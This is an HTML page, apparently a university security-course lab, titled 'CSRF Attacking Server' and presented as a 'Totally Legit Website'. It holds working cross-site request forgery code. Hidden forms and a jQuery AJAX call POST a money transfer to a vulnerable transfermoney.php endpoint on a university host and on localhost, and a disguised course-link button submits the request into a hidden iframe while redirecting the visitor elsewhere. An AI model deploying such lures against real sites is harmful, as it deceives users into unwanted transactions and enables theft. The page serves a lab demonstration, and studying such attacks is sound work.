<head>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">

<!-- Optional theme -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap-theme.min.css" integrity="sha384-fLW2N01lMqjakBkx3l/M9EahuwpSfeNvV63J5ezn3uZzapT0u7EYsXMjQV+0En5r" crossorigin="anonymous">

<title>CSRF Attacking Server</title>
</head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

<div class="container">

    <div class="starter-template">
        <h1>Totally Legit Website</h1>
<!--         <button onclick="transferandredirect();">Super Safe Link</button>
 -->
        
    <form id="tform" action = "" target="my_frame" method = "POST">
        <input name = "destination address" type = "hidden" value = "12345k6789"/>
        <input name = "amount" type = "hidden" value = "1"/>
        <button type = "submit" onclick="this.form.action='https://users.cs.duke.edu/~jkk22/CSRF/transfermoney.php'; window.location='https://users.cs.duke.edu/~bmm/';">Learn about the best professor in the world of CS 590.1: Advanced Topics in Computer Science: Computer Security</button>
    </form>


    <form id="tform1" action = "http://localhost:8080/CSRF/vulnerable_server/transfermoney.php"  method = "POST">
        <input name = "destination address" type = "hidden" value = "12345k6789"/>
        <input name = "amount" type = "hidden" value = "1"/>
        <button type = "submit" >Learn about the best  in the world of CS 590.1: Advanced Topics in Computer Science: Computer Security AGAIN</button>
    </form>

    <iframe name="my_frame" style="display:none;"></iframe>



    </div>



</div>

<script>
    function transferandredirect(){
        $.ajax({
            type: "POST",
            url: "http://localhost:8080/CSRF/vulnerable_server/transfermoney.php",
            data: "destination+address=12345k6789&amount=1",
            success: function(){
                window.location="espn.com";
            }
        })
    }
</script>